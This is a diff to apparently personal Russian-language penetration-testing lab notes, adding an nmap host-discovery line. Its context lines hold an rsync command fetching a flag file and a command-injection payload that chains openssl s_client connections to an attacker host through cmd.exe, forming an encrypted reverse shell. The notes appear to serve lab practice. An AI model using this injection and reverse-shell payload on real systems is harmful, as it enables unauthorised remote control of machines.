@@ -644,5 +644,9 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
  	из атакуемой машины (73 и 136 толко открытые)---> 127.0.0.1 & START "" cmd /c "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:136"
 
+# nmap
+
+	sudo nmap 10.129.2.0/24 -sn - скагирование хостов без портов
+	
 
 # Недостатки конфигурации периферийных устройств
